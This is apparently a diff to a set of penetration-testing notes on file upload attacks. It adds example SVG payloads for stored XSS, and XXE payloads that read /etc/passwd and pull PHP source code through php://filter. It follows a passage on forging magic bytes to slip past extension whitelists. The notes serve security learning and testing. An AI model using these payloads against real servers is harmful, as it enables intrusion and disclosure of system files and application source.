@@ -104,3 +104,33 @@ text.jpg: ASCII text
 
 Now we just need to write that Magic Bytes according to our needs to make it look like a legit file type even if the extension is not actually whitelisted.
 
+## XSS using File Type Attack
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+We can add something like this as the payload and upload this as an SVG File and then can execute a XSS Payload in the Script Section.
+
+
+## XXE Exploitation
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+If we use this as the payload and upload to the server as an SVG, it will share the contents present in the file `/etc/passwd`.
+
+
+To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+And once this is uploaded we get the contents of the PHP File as Base64 encoded content and then we could decode that.
+
